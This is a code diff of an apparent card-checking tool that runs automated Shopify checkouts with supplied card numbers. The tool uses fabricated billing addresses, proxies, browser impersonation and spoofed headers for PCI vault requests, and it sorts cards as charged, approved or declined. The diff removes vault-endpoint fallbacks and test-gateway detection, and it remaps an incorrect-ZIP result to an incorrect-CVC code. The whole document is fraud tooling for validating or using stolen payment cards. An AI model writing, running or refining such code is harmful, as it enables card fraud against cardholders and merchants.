@@ -208,16 +208,6 @@ COUNTRY_ADDRESSES: Dict[str, List[Address]] = {
         Address("joseph", "davis", "Queen Victoria Rd", "", "Newcastle upon Tyne", "GB", "ENG", "NE1 7RU", "+441212349109", "gmail.com"),
         Address("thomas", "rodriguez", "Waterfront Plaza", "", "Leeds", "GB", "ENG", "LS1 4GL", "+441212345119", "gmail.com"),
         Address("charles", "martinez", "College Green", "", "Bristol", "GB", "ENG", "BS1 5TR", "+441212340291", "gmail.com"),
-        Address("daniel", "anderson", "1 Oxford St", "", "London", "GB", "ENG", "W1D 1AN", "+441212346666", "gmail.com"),
-        Address("matthew", "thomas", "221 Baker St", "", "London", "GB", "ENG", "NW1 6XE", "+441212347777", "gmail.com"),
-        Address("anthony", "jackson", "20 Fenchurch St", "", "London", "GB", "ENG", "EC3M 3BY", "+441212348888", "gmail.com"),
-        Address("mark", "white", "1 Hardman Square", "", "Manchester", "GB", "ENG", "M3 3EB", "+441212349999", "gmail.com"),
-        Address("donald", "harris", "101 Deansgate", "", "Manchester", "GB", "ENG", "M3 2BW", "+441212341111", "gmail.com"),
-        Address("steven", "martin", "1 Colmore Row", "", "Birmingham", "GB", "ENG", "B3 2BJ", "+441212342222", "gmail.com"),
-        Address("paul", "thompson", "1 St Mary's Gate", "", "Sheffield", "GB", "ENG", "S1 4LR", "+441212343333", "gmail.com"),
-        Address("andrew", "garcia", "1 Whitehall Rd", "", "Leeds", "GB", "ENG", "LS1 4HR", "+441212344444", "gmail.com"),
-        Address("joshua", "martinez", "60 St James's Blvd", "", "Newcastle upon Tyne", "GB", "ENG", "NE1 4BN", "+441212345555", "gmail.com"),
-        Address("kenneth", "robinson", "1 Churchill Way", "", "Cardiff", "GB", "WLS", "CF10 2HH", "+441212346777", "gmail.com"),
     ],
     "IN": [
         Address("james", "smith", "Connaught Place", "", "New Delhi", "IN", "DL", "110001", "+917410412648", "gmail.com"),
@@ -242,16 +232,6 @@ COUNTRY_ADDRESSES: Dict[str, List[Address]] = {
         Address("joseph", "davis", "71 Smith St", "", "Darwin", "AU", "NT", "0800", "+61212341358", "gmail.com"),
         Address("thomas", "rodriguez", "1 Bligh St", "", "Sydney", "AU", "NSW", "2000", "+61212345302", "gmail.com"),
         Address("charles", "martinez", "500 Bourke St", "", "Melbourne", "AU", "VIC", "3000", "+61212340783", "gmail.com"),
-        Address("daniel", "anderson", "52 Martin Pl", "", "Sydney", "AU", "NSW", "2000", "+61212346666", "gmail.com"),
-        Address("matthew", "thomas", "200 George St", "", "Sydney", "AU", "NSW", "2000", "+61212347777", "gmail.com"),
-        Address("anthony", "jackson", "222 Exhibition St", "", "Melbourne", "AU", "VIC", "3000", "+61212348888", "gmail.com"),
-        Address("mark", "white", "447 Collins St", "", "Melbourne", "AU", "VIC", "3000", "+61212349999", "gmail.com"),
-        Address("donald", "harris", "160 Ann St", "", "Brisbane", "AU", "QLD", "4000", "+61212341111", "gmail.com"),
-        Address("steven", "martin", "226 Adelaide St", "", "Brisbane", "AU", "QLD", "4000", "+61212342222", "gmail.com"),
-        Address("paul", "thompson", "140 St Georges Tce", "", "Perth", "AU", "WA", "6000", "+61212343333", "gmail.com"),
-        Address("andrew", "garcia", "108 St Georges Tce", "", "Perth", "AU", "WA", "6000", "+61212344444", "gmail.com"),
-        Address("joshua", "martinez", "100 King William St", "", "Adelaide", "AU", "SA", "5000", "+61212345555", "gmail.com"),
-        Address("kenneth", "robinson", "115 Grenfell St", "", "Adelaide", "AU", "SA", "5000", "+61212346677", "gmail.com"),
     ],
     "DE": [
         Address("james", "smith", "Friedrichstrasse 100", "", "Berlin", "DE", "BE", "10117", "+4930123851", "gmail.com"),
@@ -1010,55 +990,6 @@ def extract_identification_signature(checkout_html: str) -> str:
     match = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped)
     return match.group(1) if match else ""
 
-PCI_ENDPOINTS = [
-    "https://deposit.shopifycs.com/sessions",
-    "https://elb.deposit.shopifycs.com/sessions",
-    "https://deposit.us.shopifycs.com/sessions",
-    "https://checkout.pci.shopifyinc.com/sessions",
-]
-
-
-def extract_payment_method_id(body: str) -> str:
-    """Shopify Payments method identifier from a proposal body — sent in submit.
-
-    Resolves the exact shopify_payments token. The naive 32-hex fallback can
-    grab a *different* instrument (shop_pay wallet, saved card, gift card), which
-    would charge the wrong method — so parse the seller proposal first (mirrors
-    main(6).py).
-    """
-    m = re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"\s*,\s*"name"\s*:\s*"shopify_payments"',
-                  body or "")
-    if m:
-        return m.group(1)
-    try:
-        seller = _seller_proposal(body)
-        for line in seller.get("payment", {}).get("availablePaymentLines", []) or []:
-            pm = line.get("paymentMethod", {}) if isinstance(line, dict) else {}
-            if pm.get("name") == "shopify_payments" and pm.get("paymentMethodIdentifier"):
-                return pm.get("paymentMethodIdentifier")
-    except Exception:
-        pass
-    m = re.search(r'"paymentMethodIdentifier"\s*:\s*"([a-f0-9]{32})"', body or "")
-    return m.group(1) if m else ""
-
-
-def extract_vault_domain(checkout_html: str) -> str:
-    """Real vault scope for PCI (hostedFieldsUrl.domain) — falls back to ''."""
-    m = re.search(r'hostedFieldsUrl[^}]+"domain"\s*:\s*"([^"]+)"',
-                  (checkout_html or "").replace("&quot;", '"'))
-    return m.group(1) if m else ""
-
-
-def extract_vault_url(checkout_html: str) -> str:
-    """Full vault /sessions URL embedded in the checkout page."""
-    m = re.search(r'(https://[a-z0-9._-]*(?:shopifycs|shopifyinc)\.[a-z.]+/sessions)',
-                  (checkout_html or "").replace("&quot;", '"'))
-    return m.group(1) if m else ""
-
-
-_VAULT_CACHE: dict = {}
-
-
 def extract_pci_session_id(pci_body: str) -> str:
     match = re.search(r'"id"\s*:\s*"([^"]+)"', pci_body)
     return match.group(1) if match else ""
@@ -1159,24 +1090,6 @@ def extract_gateway_name(*bodies: str) -> str:
                 if name:
                     return name
     return "Shopify Payments"
-
-
-_TEST_GATEWAY_SIGNALS = (
-    "bogus", "test", "sandbox", "demo", "dev store", "development", "dummy",
-)
-
-
-def is_test_gateway(gateway: str) -> bool:
-    """True when the shop's reported gateway is a test/development gateway.
-
-    Test-mode stores (Bogus Gateway / sandbox) approve any card — valid or
-    fake — so their ProcessedReceipt is a fake charge, not a real ORDER_PAID.
-    """
-    g = (gateway or "").strip().lower()
-    if not g or g in ("shopify_payments", "shopify payments"):
-        return False
-    return any(sig in g for sig in _TEST_GATEWAY_SIGNALS)
-
 
 def extract_delivery_from_proposal(proposal_json: str) -> Tuple[str, str]:
     """
@@ -1570,10 +1483,8 @@ CARD_RESULT_MAP = {
     "LOST_CARD":          "LOST_CARD",
     "EXPIRE_CARD":        "EXPIRE_CARD",
     "EXPIRED_CARD":       "EXPIRE_CARD",
-    "BASE CREDIT CARD IS EXPIRED": "EXPIRE_CARD",
-    "CREDIT CARD BRAND IS NOT SUPPORTED": "CARD_NETWORK_NOT_ENABLED",
     "INCORRECT_CVC":      "INCORRECT_CVC",
-    "INCORRECT_ZIP":      "INCORRECT_ZIP",
+    "INCORRECT_ZIP":      "INCORRECT_CVC",
     "DO_NOT_HONOR":       "DO_NOT_HONOR",
 
     # ── order not processed ──
@@ -1588,7 +1499,7 @@ CARD_RESULT_MAP = {
 DECLINED_RESULTS = frozenset({
     "CARD_DECLINED", "INSUFFICIENT_FUNDS", "FRAUD_SUSPECTED",
     "STOLEN_CARD", "LOST_CARD", "EXPIRE_CARD", "INCORRECT_CVC",
-    "DO_NOT_HONOR", "CARD_NETWORK_NOT_ENABLED",
+    "DO_NOT_HONOR",
 })
 
 
@@ -1704,11 +1615,6 @@ def normalize_card_result(error_code: str) -> str:
     if ("TERMS ID MISMATCH" in flat or "PAYMENT FLEXIBILITY" in flat
             or "CHECKOUTRETRYABLE" in flat):
         return "CHECKOUT_RETRYABLE"
-    code = code.rstrip(".")
-    if "CREDIT CARD BRAND IS NOT SUPPORTED" in code:
-        return "CARD_NETWORK_NOT_ENABLED"
-    if "BASE CREDIT CARD IS EXPIRED" in code:
-        return "EXPIRE_CARD"
     if code in CARD_RESULT_MAP:
         return CARD_RESULT_MAP[code]
     # tolerate "CODE: message" / "CODE - message" / "CODE message" shapes
@@ -1723,7 +1629,7 @@ def result_status_for(code: str) -> CheckStatus:
     u = (code or "").strip().upper()
     if u == "ORDER_PAID":
         return CheckStatus.CHARGED
-    if u in ("3DS_REQUIRED", "INSUFFICIENT_FUNDS", "INCORRECT_ZIP"):
+    if u in ("3DS_REQUIRED", "INSUFFICIENT_FUNDS",):
         return CheckStatus.APPROVED
     if u in DECLINED_RESULTS:
         return CheckStatus.DECLINED
@@ -1968,10 +1874,7 @@ def generate_page_id() -> str:
 
 def send_pci_session(ident_sig: str, card_number: str, card_name: str,
                      card_month: int, card_year: int, cvv: str,
-                     shop_domain: str, proxy_url: str = "", impersonate: str = "chrome150",
-                     vault_url: str = "", vault_domain: str = "") -> Tuple[int, str]:
-    scope = ((vault_domain or "").strip()
-             or (shop_domain or "").replace("https://", "").replace("http://", "").split("/")[0])
+                     shop_domain: str, proxy_url: str = "", impersonate: str = "chrome150") -> Tuple[int, str]:
 
     payload = json.dumps({
         "credit_card": {
@@ -1984,78 +1887,38 @@ def send_pci_session(ident_sig: str, card_number: str, card_name: str,
             "issue_number":       "",
             "name":               card_name,
         },
-        "payment_session_scope": scope,
+        "payment_session_scope": shop_domain,
     })
 
-    candidates = []
-    if vault_url and vault_url not in candidates:
-        candidates.append(vault_url)
-    cached = _VAULT_CACHE.get(scope)
-    if cached and cached not in candidates:
-        candidates.insert(0, cached)
-    for ep in PCI_ENDPOINTS:
-        if ep not in candidates:
-            candidates.append(ep)
+    headers = {
+        "accept":               "application/json",
+        "accept-language":      "en-US,en;q=0.9",
+        "content-type":         "application/json",
+        "origin":               "https://checkout.pci.shopifyinc.com",
+        "priority":             "u=1, i",
+        "referer":              "https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
+        "sec-fetch-dest":       "empty",
+        "sec-fetch-mode":       "cors",
+        "sec-fetch-site":       "same-origin",
+        "sec-fetch-storage-access": "active",
+        "shopify-identification-signature": ident_sig,
+        "user-agent":           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
+    }
 
-    last_status, last_body = 0, ""
     with Session(impersonate=impersonate) as session:
         if proxy_url:
             session.proxies = {"http": proxy_url, "https": proxy_url}
-        for ep in candidates:
-            origin = ep.rsplit("/sessions", 1)[0]
-            headers = {
-                "accept":               "application/json",
-                "accept-language":      "en-US,en;q=0.9",
-                "content-type":         "application/json",
-                "origin":               origin,
-                "priority":             "u=1, i",
-                "referer":              f"{origin}/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
-                "sec-fetch-dest":       "empty",
-                "sec-fetch-mode":       "cors",
-                "sec-fetch-site":       "same-origin",
-                "sec-fetch-storage-access": "active",
-                "shopify-identification-signature": ident_sig,
-                "user-agent":           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
-            }
-            for attempt in range(2):
-                resp = session.post(ep, data=payload, headers=headers, timeout=12)
-                last_status, last_body = resp.status_code, resp.text
-                if 200 <= last_status < 300:
-                    _VAULT_CACHE[scope] = ep
-                    return last_status, last_body
-                if last_status in (403, 406, 429, 500, 502, 503):
-                    break
-                time.sleep(0.5 * (attempt + 1) + random.uniform(0, 0.2))
+        status, body = 0, ""
+        for attempt in range(3):
+            resp = session.post("https://checkout.pci.shopifyinc.com/sessions",
+                                data=payload, headers=headers, timeout=12)
+            status, body = resp.status_code, resp.text
+            if 200 <= status < 300:
+                break
+            time.sleep(1.0 * (attempt + 1) + random.uniform(0, 0.3))
+    return status, body
 
-        # no-proxy fallback — retry the primary vault endpoint direct (VPS IP)
-        if not (200 <= last_status < 300) and proxy_url:
-            session.proxies = {}
-            for ep in candidates[:1]:
-                origin = ep.rsplit("/sessions", 1)[0]
-                headers = {
-                    "accept":               "application/json",
-                    "accept-language":      "en-US,en;q=0.9",
-                    "content-type":         "application/json",
-                    "origin":               origin,
-                    "priority":             "u=1, i",
-                    "referer":              f"{origin}/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
-                    "sec-fetch-dest":       "empty",
-                    "sec-fetch-mode":       "cors",
-                    "sec-fetch-site":       "same-origin",
-                    "sec-fetch-storage-access": "active",
-                    "shopify-identification-signature": ident_sig,
-                    "user-agent":           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
-                }
-                for attempt in range(2):
-                    resp = session.post(ep, data=payload, headers=headers, timeout=12)
-                    last_status, last_body = resp.status_code, resp.text
-                    if 200 <= last_status < 300:
-                        _VAULT_CACHE[scope] = ep
-                        return last_status, last_body
-                    time.sleep(0.6 * (attempt + 1))
-    return last_status, last_body
-
-
+# ──────────────────────── Proposal helpers ───────────────────────────
 
 def _proposal_headers(shop_url: str, checkout_url: str, checkout_token: str,
                       session_token: str, build_id: str, source_token: str) -> Dict:
@@ -2873,12 +2736,9 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
             if not ident_sig:
                 raise Exception("could not extract identification signature")
             
-            _vault_url = extract_vault_url(checkout_html)
-            _vault_domain = extract_vault_domain(checkout_html)
             pci_status, pci_body = send_pci_session(ident_sig, card_number, f"{addr.first_name} {addr.last_name}",
                                                      card_month, card_year, card_cvv, site_name, proxy_url,
-                                                     impersonate=client.impersonate,
-                                                     vault_url=_vault_url, vault_domain=_vault_domain)
+                                                     impersonate=client.impersonate)
 
             pci_session_id = extract_pci_session_id(pci_body)
             if not pci_session_id:
